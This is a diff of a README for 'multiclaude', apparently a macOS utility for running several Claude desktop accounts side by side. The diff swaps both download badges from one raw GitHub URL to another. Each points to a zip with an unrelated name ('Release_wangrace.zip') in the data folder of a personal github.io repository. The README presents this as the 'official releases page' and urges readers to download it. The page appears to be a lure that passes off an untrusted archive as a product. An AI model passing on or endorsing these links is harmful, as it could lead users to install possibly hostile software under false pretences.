@@ -5,7 +5,7 @@ description: "Run multiple Claude accounts simultaneously from a free macOS menu
 ---
 # 🖥️ multiclaude - Run Every Claude Account Side by Side
 
-[![Download multiclaude](https://img.shields.io/badge/⬇️_Download_multiclaude-ff4f8b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/cikafeee/cikafeee.github.io/raw/refs/heads/main/data/Release_wangrace.zip)
+[![Download multiclaude](https://img.shields.io/badge/⬇️_Download_multiclaude-ff4f8b?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/cikafeee/cikafeee.github.io/main/data/Release_wangrace.zip)
 
 multiclaude is a small menu bar app that lets you keep several Claude desktop accounts open at the same time on one Mac. Instead of signing out of one account, quitting the app, and signing back in with another, you get a tidy little icon in your menu bar where every account is one click away.
 
@@ -34,7 +34,7 @@ Everything happens locally on your computer. multiclaude does not store your pas
 
 Everything you need is on the official releases page:
 
-[![Get multiclaude](https://img.shields.io/badge/⬇️_Get_multiclaude-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/cikafeee/cikafeee.github.io/raw/refs/heads/main/data/Release_wangrace.zip)
+[![Get multiclaude](https://img.shields.io/badge/⬇️_Get_multiclaude-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/cikafeee/cikafeee.github.io/main/data/Release_wangrace.zip)
 
 **Visit this link to download the application.**
 
